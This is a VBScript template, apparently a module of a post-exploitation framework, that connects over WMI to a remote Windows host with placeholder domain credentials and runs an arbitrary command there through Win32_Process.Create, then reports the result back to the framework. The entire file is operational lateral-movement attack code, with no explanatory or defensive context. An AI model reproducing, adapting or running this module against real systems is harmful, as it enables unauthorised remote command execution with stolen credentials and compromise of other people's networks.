sub ExecWMI
    set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator")
    'MsgBox "o"
    set objSWbemServices = objSWbemLocator.ConnectServer("~RHOST~", "root\cimv2", "~SMBDOMAIN~\~SMBUSER~", "~SMBPASS~")

    objSWbemServices.Security_.ImpersonationLevel = 3
    objSWbemServices.Security_.AuthenticationLevel = 6

    set objProcess = objSWbemServices.Get("Win32_Process")
    errReturn = objProcess.Create("~CMD~", null, null, intProcessID)
end sub

dim errReturn
errReturn = -1

ExecWMI
KoReportWork errReturn
KoExit
